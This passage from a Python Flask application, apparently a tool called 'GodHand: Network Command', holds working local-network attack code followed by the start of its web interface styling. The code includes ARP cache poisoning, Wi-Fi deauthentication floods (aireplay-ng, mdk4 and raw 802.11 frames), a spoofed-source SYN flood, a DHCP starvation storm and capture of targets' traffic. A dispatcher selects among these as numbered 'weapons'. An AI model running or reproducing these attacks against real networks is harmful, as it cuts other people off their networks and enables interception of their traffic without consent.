        script = textwrap.dedent(f"""
            import socket, struct, time, sys
            IFACE = '{iface}'
            GATEWAY = '{gateway}'
            TARGETS = {targets}
            FAKE = bytes.fromhex('{fake_mac.replace(':','')}')
            def send_arp(op, src_ip, dst_ip, src_mac, dst_mac):
                try:
                    eth = dst_mac + src_mac + struct.pack('!H', 0x0806)
                    arp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, op)
                    arp += src_mac + socket.inet_aton(src_ip)
                    arp += dst_mac + socket.inet_aton(dst_ip)
                    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
                    s.bind((IFACE, 0))
                    s.send(eth + arp)
                    s.close()
                except Exception as e:
                    print(e, file=sys.stderr)
            while True:
                for t in TARGETS:
                    send_arp(2, GATEWAY, t, FAKE, b'\\xff'*6)
                    send_arp(2, t, GATEWAY, FAKE, b'\\xff'*6)
                time.sleep(0.5)
        """)
        fd, path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        with open(path, 'w') as f:
            f.write(script)
        proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
        time.sleep(0.5)
        if proc.poll() is not None:
            raise RuntimeError('ARP fallback script exited immediately')
        threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
        pids.append(proc)
        return pids

def start_attack_deauth_native(targets, iface):
    """Continuously re-deauth targets that are associated stations on our own AP -- no monitor mode."""
    stations = set(list_ap_stations(iface))
    target_macs = []
    for t_ip in targets:
        for h in STATE['hosts']:
            if h['ip'] == t_ip and h['mac'].lower() in stations:
                target_macs.append(h['mac'])
                break
    if not target_macs:
        raise RuntimeError(f'{iface} is running as an access point, but none of the selected targets are currently associated stations on it.')
    add_log('info', f'{iface} is in AP mode -- using native kernel deauth flood (station-del), no monitor mode, for {len(target_macs)} station(s)')
    script = textwrap.dedent(f"""
        import subprocess, time
        IFACE = '{iface}'
        MACS = {target_macs}
        while True:
            for mac in MACS:
                subprocess.run(['iw', 'dev', IFACE, 'station', 'del', mac, 'subtype', '0xC', 'reason-code', '2'],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)
    """)
    fd, path = tempfile.mkstemp(suffix='.py')
    os.close(fd)
    with open(path, 'w') as f:
        f.write(script)
    proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
    time.sleep(0.5)
    if proc.poll() is not None:
        raise RuntimeError('Native deauth flood script exited immediately')
    threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
    return [proc]

def start_attack_deauth(targets, iface):
    add_log('info', f'Starting Deauth Flood on {iface} for {len(targets)} targets')
    if get_iface_type(iface) == 'AP':
        return start_attack_deauth_native(targets, iface)
    # First check if monitor mode is supported
    if not check_monitor_support(iface):
        raise RuntimeError('Monitor mode is not supported on this interface. Deauth attack requires monitor mode and a compatible wireless adapter.')
    if not set_monitor(iface, True, raise_on_fail=True):
        raise RuntimeError('Failed to enable monitor mode')
    pids = []
    gateway_mac = get_gateway_mac(iface, STATE['gateway']) if STATE['gateway'] else None

    if ensure_tool('aireplay-ng', 'aircrack-ng'):
        if targets and gateway_mac:
            for t_ip in targets:
                t_mac = None
                for h in STATE['hosts']:
                    if h['ip'] == t_ip:
                        t_mac = h['mac']
                        break
                if t_mac:
                    cmd = ['aireplay-ng', '-0', '0', '-a', gateway_mac, '-c', t_mac, iface]
                    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
                    time.sleep(0.1)
                    if proc.poll() is not None:
                        continue
                    pids.append(proc)
        if not pids:
            cmd = ['aireplay-ng', '-0', '0', '-a', 'FF:FF:FF:FF:FF:FF', iface]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            time.sleep(0.1)
            if proc.poll() is not None:
                raise RuntimeError('aireplay-ng broadcast deauth failed')
            pids.append(proc)
        return pids
    elif ensure_tool('mdk4'):
        cmd = ['mdk4', iface, 'd', '-c', '100']
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        time.sleep(0.1)
        if proc.poll() is not None:
            raise RuntimeError('mdk4 deauth failed')
        pids.append(proc)
        return pids
    else:
        # Fallback raw deauth
        script = textwrap.dedent(f"""
            import socket, struct, time
            IFACE = '{iface}'
            radiotap = b'\\x00\\x00\\x0c\\x00\\x04\\x80\\x00\\x00\\x00'
            def deauth_packet(dst, bssid, seq):
                frame_control = struct.pack('<H', 0x00c0)
                duration = b'\\x00\\x00'
                seq_control = struct.pack('<H', seq & 0xfff)
                reason = struct.pack('<H', 7)
                frame = frame_control + duration + dst + bssid + bssid + seq_control + reason
                return radiotap + frame
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.bind((IFACE, 0))
            seq = 0
            bssid = b'\\xff'*6
            while True:
                sock.send(deauth_packet(b'\\xff'*6, bssid, seq))
                seq = (seq + 1) & 0xfff
                time.sleep(0.1)
        """)
        fd, path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        with open(path, 'w') as f:
            f.write(script)
        proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
        time.sleep(0.5)
        if proc.poll() is not None:
            raise RuntimeError('Deauth fallback script exited immediately')
        threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
        pids.append(proc)
        return pids

def start_attack_syn_flood(targets, port, iface):
    add_log('info', f'Starting SYN Flood on {iface}:{port} for {len(targets)} targets')
    pids = []
    if ensure_tool('hping3'):
        for t in targets:
            cmd = ['hping3', '-S', '-p', str(port), '--flood', '--rand-source', t]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            time.sleep(0.1)
            if proc.poll() is not None:
                continue
            pids.append(proc)
        if not pids:
            raise RuntimeError('No hping3 processes started')
        return pids
    else:
        # Raw socket fallback
        script = textwrap.dedent(f"""
            import socket, struct, random, time, sys
            TARGETS = {targets}
            PORT = {port}
            def tcp_checksum(ip_src, ip_dst, tcp_segment):
                psh = socket.inet_aton(ip_src) + socket.inet_aton(ip_dst) + b'\\x00' + struct.pack('!B', 6) + struct.pack('!H', len(tcp_segment))
                checksum_data = psh + tcp_segment
                if len(checksum_data) % 2 == 1:
                    checksum_data += b'\\x00'
                s = sum(struct.unpack('!%dH' % (len(checksum_data)//2), checksum_data))
                s = (s >> 16) + (s & 0xffff)
                s += s >> 16
                return ~s & 0xffff
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            while True:
                for t in TARGETS:
                    try:
                        src_ip = '.'.join(str(random.randint(1,254)) for _ in range(4))
                        iph = b'\\x45\\x00\\x00\\x28' + struct.pack('!H', random.randint(0,65535)) + b'\\x40\\x00\\x40\\x06\\x00\\x00'
                        iph += socket.inet_aton(src_ip) + socket.inet_aton(t)
                        tcp = struct.pack('!HHIIBBHHH', random.randint(1024,65535), PORT, 0,0, 0x50,0x02, 5840,0,0)
                        tcp = tcp[:16] + struct.pack('!H', tcp_checksum(src_ip, t, tcp)) + tcp[18:]
                        pkt = iph + tcp
                        s.sendto(pkt, (t,0))
                    except Exception as e:
                        pass
                time.sleep(0.01)
        """)
        fd, path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        with open(path, 'w') as f:
            f.write(script)
        proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
        time.sleep(0.5)
        if proc.poll() is not None:
            raise RuntimeError('SYN flood fallback script exited immediately')
        threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
        pids.append(proc)
        return pids

def start_attack_dhcp_storm(targets, gateway, iface):
    add_log('info', f'Starting DHCP Storm on {iface} targeting DHCP server {gateway}')
    pids = []
    if ensure_tool('dhcpig'):
        cmd = ['dhcpig', '-i', iface, '-t', gateway, '-s', '1000']
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        time.sleep(0.1)
        if proc.poll() is not None:
            raise RuntimeError('dhcpig failed to start')
        pids.append(proc)
        return pids
    else:
        # Fallback raw DHCP storm
        script = textwrap.dedent(f"""
            import socket, struct, random, time
            IFACE = '{iface}'
            GATEWAY = '{gateway}'
            our_mac = bytes.fromhex('{get_mac(iface).replace(':','')}')
            BROADCAST = '255.255.255.255'
            def udp_checksum(ip_src, ip_dst, udp_segment):
                psh = socket.inet_aton(ip_src) + socket.inet_aton(ip_dst) + b'\\x00' + struct.pack('!B', 17) + struct.pack('!H', len(udp_segment))
                checksum_data = psh + udp_segment
                if len(checksum_data) % 2 == 1:
                    checksum_data += b'\\x00'
                s = sum(struct.unpack('!%dH' % (len(checksum_data)//2), checksum_data))
                s = (s >> 16) + (s & 0xffff)
                s += s >> 16
                return ~s & 0xffff
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            while True:
                src_ip = '.'.join(str(random.randint(1,254)) for _ in range(4))
                iph = b'\\x45\\x00\\x01\\x10' + struct.pack('!H', random.randint(0,65535)) + b'\\x00\\x00\\x40\\x11\\x00\\x00'
                iph += socket.inet_aton(src_ip) + socket.inet_aton(BROADCAST)
                udp = struct.pack('!HHH', 68, 67, 0x0100)
                udp = udp + b'\\x00\\x00'
                dhcp = b'\\x01\\x01\\x06\\x00'
                dhcp += struct.pack('!I', random.randint(0, 2**32 - 1))
                dhcp += b'\\x00\\x00\\x00\\x00'
                dhcp += socket.inet_aton('0.0.0.0') * 4
                dhcp += our_mac + b'\\x00' * 10
                dhcp += b'\\x00' * 192
                dhcp += b'\\x63\\x82\\x53\\x63'
                dhcp += struct.pack('BB', 53, 1) + b'\\x01'
                dhcp += struct.pack('BB', 61, 7) + b'\\x01' + our_mac
                dhcp += b'\\xff'
                dhcp += b'\\x00' * (256 - len(dhcp))
                udp = udp[:4] + struct.pack('!H', udp_checksum(src_ip, BROADCAST, udp + dhcp)) + udp[6:]
                pkt = iph + udp + dhcp
                s.sendto(pkt, (BROADCAST, 67))
                time.sleep(0.2)
        """)
        fd, path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        with open(path, 'w') as f:
            f.write(script)
        proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
        time.sleep(0.5)
        if proc.poll() is not None:
            raise RuntimeError('DHCP storm fallback script exited immediately (raw socket permission likely denied)')
        threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
        pids.append(proc)
        return pids

COMMON_PORTS = {
    20: 'FTP-DATA', 21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
    67: 'DHCP', 68: 'DHCP', 80: 'HTTP', 110: 'POP3', 123: 'NTP', 137: 'NetBIOS',
    138: 'NetBIOS', 139: 'SMB', 143: 'IMAP', 161: 'SNMP', 194: 'IRC', 443: 'HTTPS',
    445: 'SMB', 465: 'SMTPS', 587: 'SMTP', 993: 'IMAPS', 995: 'POP3S',
    1194: 'OpenVPN', 1433: 'MSSQL', 1723: 'PPTP', 3306: 'MySQL', 3389: 'RDP',
    5060: 'SIP', 5222: 'XMPP', 5353: 'mDNS', 5900: 'VNC', 6667: 'IRC',
    8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 51820: 'WireGuard',
}

def port_service_name(port):
    return COMMON_PORTS.get(port, str(port))

def compute_traffic_stats():
    with STATE_LOCK:
        entries = list(STATE['monitor_entries'])
    if not entries:
        return {'total': 0, 'unique_hosts': 0, 'total_bytes': 0, 'top_talkers': [], 'top_ports': [], 'timeline': [0] * 30}
    total_bytes = sum(e.get('len', 0) for e in entries)
    hosts, ports = {}, {}
    for e in entries:
        for h in (e['src'], e['dst']):
            b = hosts.setdefault(h, {'count': 0, 'bytes': 0})
            b['count'] += 1
            b['bytes'] += e.get('len', 0)
        # The service port is conventionally the lower of the two -- using dp alone
        # would mislabel response packets (their dp is the remote's ephemeral port).
        key = (e['proto'], min(e['sp'], e['dp']))
        p = ports.setdefault(key, {'count': 0, 'bytes': 0})
        p['count'] += 1
        p['bytes'] += e.get('len', 0)
    top_talkers = sorted(
        ({'host': h, 'count': v['count'], 'bytes': v['bytes']} for h, v in hosts.items()),
        key=lambda x: -x['bytes'])[:8]
    top_ports = sorted(
        ({'proto': proto, 'port': port, 'service': port_service_name(port), 'count': v['count'], 'bytes': v['bytes']}
         for (proto, port), v in ports.items()),
        key=lambda x: -x['bytes'])[:8]
    now = time.time()
    bucket_seconds, n_buckets = 2, 30
    timeline = [0] * n_buckets
    for e in entries:
        idx = n_buckets - 1 - int((now - e.get('t', now)) // bucket_seconds)
        if 0 <= idx < n_buckets:
            timeline[idx] += 1
    return {
        'total': len(entries),
        'unique_hosts': len(hosts),
        'total_bytes': total_bytes,
        'top_talkers': top_talkers,
        'top_ports': top_ports,
        'timeline': timeline,
    }

def start_attack_monitor(targets, port, iface):
    add_log('info', f'Starting Traffic Capture on {iface} for {len(targets)} target(s)')
    if not set_monitor(iface, True, raise_on_fail=False):
        add_log('warn', 'Monitor mode could not be enabled; capture may be incomplete')
    with STATE_LOCK:
        STATE['monitor_log'] = []
        STATE['monitor_entries'] = []
    # Use a writable temp directory
    tmpdir = tempfile.gettempdir()
    log_path = os.path.join(tmpdir, f"godhand_monitor_{int(time.time())}.log")
    # Captures ALL TCP/UDP traffic to/from the targets (not just one port) --
    # a single-port filter would defeat the point of a top-ports breakdown.
    script = textwrap.dedent(f"""
        import socket, struct, select, time, sys, json
        IFACE = '{iface}'
        TARGETS = set({targets})
        PROTO_NAMES = {{6: 'tcp', 17: 'udp'}}
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        sock.bind((IFACE, 0))
        while True:
            r, _, _ = select.select([sock], [], [], 0.5)
            if not r:
                continue
            data = sock.recvfrom(65535)[0]
            if len(data) < 38:
                continue
            if struct.unpack('!H', data[12:14])[0] != 0x0800:
                continue
            src_ip = socket.inet_ntoa(data[26:30])
            dst_ip = socket.inet_ntoa(data[30:34])
            if src_ip not in TARGETS and dst_ip not in TARGETS:
                continue
            proto = PROTO_NAMES.get(data[23])
            if proto is None:
                continue
            sp, dp = struct.unpack('!HH', data[34:38])
            length = struct.unpack('!H', data[16:18])[0]
            print(json.dumps({{'t': time.time(), 'src': src_ip, 'dst': dst_ip, 'sp': sp, 'dp': dp, 'proto': proto, 'len': length}}))
            sys.stdout.flush()
    """)
    fd, path = tempfile.mkstemp(suffix='.py')
    os.close(fd)
    with open(path, 'w') as f:
        f.write(script)
    try:
        log_file = open(log_path, 'w')
    except Exception as e:
        raise RuntimeError(f'Cannot open log file {log_path}: {e}')
    proc = subprocess.Popen(['python3', path], stdout=log_file, stderr=subprocess.PIPE)
    time.sleep(0.5)
    if proc.poll() is not None:
        raise RuntimeError('Monitor script exited immediately')
    update_state('monitor_log_path', log_path)
    threading.Thread(target=lambda: (proc.wait(), log_file.close(), os.unlink(path)), daemon=True).start()
    def update_monitor_log():
        last_pos = 0
        while proc.poll() is None:
            try:
                with open(log_path, 'r') as lf:
                    lf.seek(last_pos)
                    new_lines = lf.readlines()
                    last_pos = lf.tell()
                    if new_lines:
                        entries = []
                        texts = []
                        for line in new_lines:
                            try:
                                e = json.loads(line)
                            except ValueError:
                                continue
                            entries.append(e)
                            arrow = '->' if e['src'] in targets else '<-'
                            other_port = e['dp'] if arrow == '->' else e['sp']
                            texts.append(f"{e['src']} {arrow} {e['dst']}:{other_port} ({e['proto']}, {e['len']}B)\n")
                        if entries:
                            with STATE_LOCK:
                                STATE['monitor_entries'] = (STATE['monitor_entries'] + entries)[-500:]
                                STATE['monitor_log'] = (STATE['monitor_log'] + texts)[-100:]
            except:
                pass
            time.sleep(0.5)
    threading.Thread(target=update_monitor_log, daemon=True).start()
    return [proc]

def run_attack(weapon_id, targets, gateway, port, iface):
    if not targets:
        raise ValueError('No targets')
    if weapon_id == 1:
        return start_attack_arp_freeze(targets, gateway, iface)
    elif weapon_id == 2:
        return start_attack_deauth(targets, iface)
    elif weapon_id == 3:
        return start_attack_syn_flood(targets, port, iface)
    elif weapon_id == 4:
        return start_attack_dhcp_storm(targets, gateway, iface)
    elif weapon_id == 5:
        return start_attack_monitor(targets, port, iface)
    return None

def kill_attack(pids):
    for proc in pids:
        try:
            proc.terminate()
            proc.wait(timeout=2)
        except:
            try:
                proc.kill()
            except:
                pass

# ---------- kick & block with verification ----------
def kick_client(ip, mac, iface):
    add_log('info', f'Attempting to kick {ip} ({mac})')
    iface_type = get_iface_type(iface)
    if iface_type == 'AP':
        # This interface is our own access point -- kick the station natively via
        # the kernel, no monitor mode. Never fall back to monitor mode here: flipping
        # an AP interface into monitor mode would drop every connected client, not
        # just this one.
        if mac.lower() not in list_ap_stations(iface):
            raise RuntimeError(f'{iface} is running as an access point, but {mac} is not currently an associated station on it.')
        add_log('info', f'{iface} is in AP mode -- using native kernel deauth (station-del), no monitor mode')
        if not native_deauth_station(iface, mac):
            raise RuntimeError(f'Native deauth (station-del) failed for {mac} on {iface}')
        add_log('success', f'Sent native deauth to {mac}')
        time.sleep(2)
        reachable = server_ping(ip, timeout=1)
        if reachable:
            add_log('warn', f'Target {ip} is still responding to ping after kick')
            return False
        add_log('success', f'Target {ip} is not responding to ping after kick')
        return True

    if not check_monitor_support(iface):
        raise RuntimeError('Monitor mode is not supported on this interface.')
    if not set_monitor(iface, True, raise_on_fail=True):
        raise RuntimeError('Cannot enable monitor mode')
    if ensure_tool('aireplay-ng', 'aircrack-ng'):
        cmd = ['aireplay-ng', '-0', '5', '-a', 'FF:FF:FF:FF:FF:FF', '-c', mac, iface]
        res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
        if res.returncode != 0:
            raise RuntimeError('aireplay-ng deauth failed: ' + res.stderr.decode())
    else:
        script = textwrap.dedent(f"""
            import socket, struct, time
            IFACE = '{iface}'
            MAC = '{mac}'
            dst_mac = bytes.fromhex(MAC.replace(':', ''))
            radiotap = b'\\x00\\x00\\x0c\\x00\\x04\\x80\\x00\\x00\\x00'
            def pkt(dst, seq):
                frame_control = struct.pack('<H', 0x00c0)
                duration = b'\\x00\\x00'
                seq_control = struct.pack('<H', seq & 0xfff)
                reason = struct.pack('<H', 7)
                bssid = b'\\xff'*6
                frame = frame_control + duration + dst + bssid + bssid + seq_control + reason
                return radiotap + frame
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.bind((IFACE, 0))
            for i in range(20):
                sock.send(pkt(dst_mac, i))
                sock.send(pkt(b'\\xff'*6, i))
                time.sleep(0.05)
            sock.close()
        """)
        fd, path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        with open(path, 'w') as f:
            f.write(script)
        res = subprocess.run(['python3', path], stderr=subprocess.PIPE, timeout=10)
        os.unlink(path)
        if res.returncode != 0:
            raise RuntimeError('Deauth fallback script failed')
    set_monitor(iface, False)
    time.sleep(2)
    reachable = server_ping(ip, timeout=1)
    if reachable:
        add_log('warn', f'Target {ip} is still responding to ping after kick')
        return False
    else:
        add_log('success', f'Target {ip} is not responding to ping after kick')
        return True

def block_mac(mac):
    if not mac:
        raise ValueError('No MAC')
    add_log('info', f'Toggling block for MAC {mac}')
    with STATE_LOCK:
        currently_blocked = mac in STATE['blocked_macs']
    if currently_blocked:
        subprocess.run(['iptables', '-D', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                       stderr=subprocess.PIPE, timeout=5)
        subprocess.run(['iptables', '-D', 'FORWARD', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                       stderr=subprocess.PIPE, timeout=5)
        check = subprocess.run(['iptables', '-C', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                               stderr=subprocess.PIPE, timeout=5)
        if check.returncode == 0:
            raise RuntimeError('Failed to remove iptables rule')
        discard_from_set('blocked_macs', mac)
        add_log('success', f'Unblocked {mac}')
        return False
    else:
        subprocess.run(['iptables', '-I', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                       stderr=subprocess.PIPE, timeout=5)
        subprocess.run(['iptables', '-I', 'FORWARD', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                       stderr=subprocess.PIPE, timeout=5)
        check = subprocess.run(['iptables', '-C', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                               stderr=subprocess.PIPE, timeout=5)
        if check.returncode != 0:
            raise RuntimeError('Failed to insert iptables rule')
        add_to_set('blocked_macs', mac)
        add_log('success', f'Blocked {mac}')
        return True

# ---------- Flask routes ----------
@app.route('/')
def index():
    # The entire HTML/CSS/JS is embedded as a raw string to avoid escape issues.
    html_template = r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>GodHand: Network Command</title>
<style>
:root {
  --bg-base: #0A0F14;
  --bg-elevated: #111820;
  --bg-inset: #0D131A;
  --border-subtle: #1E2A36;
  --border-strong: #2C3E50;
  --text-primary: #E6EDF3;
  --text-secondary: #9BAAB8;
  --text-disabled: #5A6B7A;
  --accent-primary: #38BDF8;
  --accent-secondary: #0EA5E9;
  --accent-tertiary: #7DD3FC;
  --success: #34D399;
  --warning: #FBBF24;
  --danger: #F87171;
  --info: #818CF8;
  --special: #C084FC;
  --glow-accent: rgba(56,189,248,0.15);
  --glow-danger: rgba(248,113,113,0.15);
  --glow-success: rgba(52,211,153,0.15);
  --radius: 12px;
  --shadow: 0 4px 12px rgba(0,0,0,0.3);
}
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
  background: var(--bg-base);
  color: var(--text-primary);
  font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
}

/* ---------- login ---------- */
.login-screen {
  position: fixed;
  inset: 0;
  z-index: 1000;
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: hidden;
}
.login-bg {
  position: absolute;
  inset: 0;
  background:
    radial-gradient(ellipse 900px 700px at 12% 15%, rgba(56,189,248,0.20), transparent 60%),
    radial-gradient(ellipse 800px 800px at 88% 80%, rgba(192,132,252,0.16), transparent 60%),
    radial-gradient(ellipse 1000px 600px at 50% 105%, rgba(129,140,248,0.12), transparent 60%),
    radial-gradient(ellipse 600px 600px at 75% 8%, rgba(14,165,233,0.14), transparent 60%),
    linear-gradient(160deg, #060A0F 0%, #0A0F14 45%, #060A0F 100%);
  animation: login-bg-drift 36s ease-in-out infinite alternate;
}
.login-bg::after {
  content: '';
  position: absolute;
  inset: 0;
  background-image:
    radial-gradient(1.5px 1.5px at 8% 22%, rgba(224,242,254,0.9), transparent),
    radial-gradient(1px 1px at 18% 68%, rgba(224,242,254,0.7), transparent),
    radial-gradient(2px 2px at 27% 12%, rgba(224,242,254,0.8), transparent),
    radial-gradient(1px 1px at 34% 44%, rgba(224,242,254,0.6), transparent),
    radial-gradient(1.5px 1.5px at 42% 78%, rgba(224,242,254,0.9), transparent),
    radial-gradient(1px 1px at 51% 30%, rgba(224,242,254,0.5), transparent),
    radial-gradient(2px 2px at 58% 60%, rgba(224,242,254,0.8), transparent),
    radial-gradient(1px 1px at 66% 15%, rgba(224,242,254,0.6), transparent),
    radial-gradient(1.5px 1.5px at 73% 85%, rgba(224,242,254,0.9), transparent),
    radial-gradient(1px 1px at 81% 38%, rgba(224,242,254,0.6), transparent),
    radial-gradient(2px 2px at 88% 62%, rgba(224,242,254,0.8), transparent),
    radial-gradient(1px 1px at 93% 20%, rgba(224,242,254,0.5), transparent),
    radial-gradient(1.5px 1.5px at 5% 88%, rgba(224,242,254,0.7), transparent),
    radial-gradient(1px 1px at 63% 92%, rgba(224,242,254,0.5), transparent),
    radial-gradient(1.5px 1.5px at 97% 78%, rgba(224,242,254,0.7), transparent);
  opacity: 0.5;
}
@keyframes login-bg-drift {
  0% { transform: scale(1) translate(0, 0); }
  100% { transform: scale(1.04) translate(-1.5%, -1%); }
}
.login-card {
  position: relative;
  z-index: 1;
  width: 90%;
  max-width: 380px;
  padding: 40px 32px;
  background: rgba(17, 24, 32, 0.55);
  backdrop-filter: blur(24px) saturate(160%);
  -webkit-backdrop-filter: blur(24px) saturate(160%);
  border: 1px solid rgba(255,255,255,0.12);
  border-radius: 24px;
  box-shadow: 0 8px 32px rgba(0,0,0,0.4), 0 1px 0 rgba(255,255,255,0.08) inset;
  text-align: center;
  animation: login-card-in 0.5s cubic-bezier(0.16, 1, 0.3, 1);
}
@keyframes login-card-in {
  from { opacity: 0; transform: translateY(12px) scale(0.98); }
  to { opacity: 1; transform: translateY(0) scale(1); }
}
.login-logo {
  width: 56px;
  height: 56px;
  margin: 0 auto 16px;
  border-radius: 16px;
  background: linear-gradient(135deg, #0EA5E9, #38BDF8);
  display: flex;
  align-items: center;
  justify-content: center;
  color: #04121C;
  font-weight: 700;
  font-size: 26px;
  box-shadow: 0 4px 16px rgba(56,189,248,0.35);
}
.login-title {
  font-size: 1.6rem;
  font-weight: 600;
  letter-spacing: -0.02em;
  margin-bottom: 2px;
}
.login-subtitle {
  color: var(--text-secondary);
  font-size: 0.85rem;
  margin-bottom: 28px;
}
.login-field { margin-bottom: 14px; }
.login-field input {
  width: 100%;
  background: rgba(255,255,255,0.06);
  border: 1px solid rgba(255,255,255,0.12);
  color: var(--text-primary);
  border-radius: 12px;
  padding: 14px 16px;
  font-size: 1rem;
  font-family: inherit;
  transition: border 0.2s, box-shadow 0.2s, background 0.2s;
}
.login-field input::placeholder { color: var(--text-disabled); }
.login-field input:focus {
  outline: none;
  border-color: var(--accent-primary);
  background: rgba(255,255,255,0.09);
  box-shadow: 0 0 0 4px rgba(56,189,248,0.15);
}
.login-btn {
  position: relative;
  overflow: hidden;
  width: 100%;
  background: linear-gradient(135deg, var(--accent-secondary), var(--accent-primary));
  color: #04121C;
  border: none;
  border-radius: 12px;
  padding: 14px;
  font-size: 1rem;
  font-weight: 600;
  font-family: inherit;
  cursor: pointer;
  margin-top: 6px;
  box-shadow: 0 4px 14px rgba(56,189,248,0.3);
  transition: transform 0.15s, box-shadow 0.15s;
}
.login-btn:hover { transform: translateY(-1px); box-shadow: 0 6px 18px rgba(56,189,248,0.4); }
.login-btn:active { transform: translateY(0) scale(0.98); }
.login-btn:disabled { opacity: 0.6; cursor: not-allowed; }
.login-ripple {
  position: absolute;
  border-radius: 50%;
  background: rgba(255,255,255,0.5);
  transform: scale(0);
  animation: login-ripple-anim 0.6s ease-out;
  pointer-events: none;
}
@keyframes login-ripple-anim {
  to { transform: scale(3); opacity: 0; }
}
.login-error {
  margin-top: 14px;
  padding: 10px 14px;
  background: var(--glow-danger);
  border: 1px solid rgba(248,113,113,0.3);
  color: var(--danger);
  border-radius: 10px;
  font-size: 0.85rem;
}
@media (prefers-reduced-motion: reduce) {
  .login-bg, .login-card { animation: none; }
}
header {
  background: var(--bg-elevated);
  border-bottom: 1px solid var(--border-subtle);
  padding: 12px 16px;
  display: flex;
  align-items: center;
  gap: 12px;
  position: sticky;
  top: 0;
  z-index: 100;
}
.logo {
  display: flex;
  align-items: center;
  gap: 10px;
  font-weight: 700;
  font-size: 1.2rem;
  color: var(--text-primary);
  text-decoration: none;
}
.logo-icon {
  width: 32px;
  height: 32px;
  background: linear-gradient(135deg, #0EA5E9, #38BDF8);
  border-radius: 8px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #04121C;
  font-weight: bold;
  font-size: 18px;
}
.status-indicator {
  margin-left: auto;
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 0.9rem;
}
.status-dot {
  width: 10px;
  height: 10px;
  border-radius: 50%;
  background: var(--success);
  box-shadow: 0 0 8px var(--success);
}
.status-dot.running {
  background: var(--danger);
  box-shadow: 0 0 8px var(--danger);
  animation: pulse 1.5s infinite;
}
@keyframes pulse {
  0% { opacity: 1; }
  50% { opacity: 0.3; }
  100% { opacity: 1; }
}
.spinner {
  display: inline-block;
  width: 16px;
  height: 16px;
  border: 2px solid var(--border-strong);
  border-top-color: var(--accent-primary);
  border-radius: 50%;
  animation: spin 0.7s linear infinite;
  vertical-align: -3px;
}
@keyframes spin {
  to { transform: rotate(360deg); }
}
nav {
  background: var(--bg-elevated);
  border-bottom: 1px solid var(--border-subtle);
  display: flex;
  overflow-x: auto;
  -webkit-overflow-scrolling: touch;
  padding: 0 8px;
}
nav button {
  background: none;
  border: none;
  color: var(--text-secondary);
  padding: 14px 16px;
  font-size: 0.9rem;
  cursor: pointer;
  white-space: nowrap;
  display: flex;
  align-items: center;
  gap: 6px;
  border-bottom: 3px solid transparent;
  transition: all 0.2s;
}
nav button.active {
  color: var(--accent-primary);
  border-bottom-color: var(--accent-primary);
}
nav button .icon {
  font-size: 1.2rem;
}
main {
  flex: 1;
  padding: 16px;
  max-width: 1200px;
  width: 100%;
  margin: 0 auto;
}
.tab-content {
  display: none;
}
.tab-content.active {
  display: block;
}
.card {
  background: var(--bg-elevated);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius);
  padding: 20px;
  margin-bottom: 16px;
  box-shadow: var(--shadow);
}
.card h2 {
  font-size: 1.2rem;
  margin-bottom: 4px;
  display: flex;
  align-items: center;
  gap: 8px;
}
.card .sub {
  color: var(--text-secondary);
  font-size: 0.85rem;
  margin-bottom: 16px;
}
.row {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
  margin-bottom: 12px;
  align-items: center;
}
input, select, textarea {
